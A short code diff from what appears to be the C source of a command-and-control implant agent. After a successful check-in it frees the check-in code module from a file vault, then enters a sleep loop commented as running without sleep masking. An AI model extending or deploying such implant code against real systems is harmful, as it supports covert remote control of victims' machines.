@@ -342,6 +342,9 @@ void go() {
 	dprintf("Successful checkin with payload UUID %s and callback UUID %s", state.params.payload_uuid, state.params.callback_uuid);
 	#endif
 	
+	remove_from_vault(&state.file_vault, state.builtin_picos.checkin);
+	state.builtin_picos.checkin = "(UNALLOCATED)";
+	
 	while (1) {
 		// Look ma, no masking!
 		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), 5000);
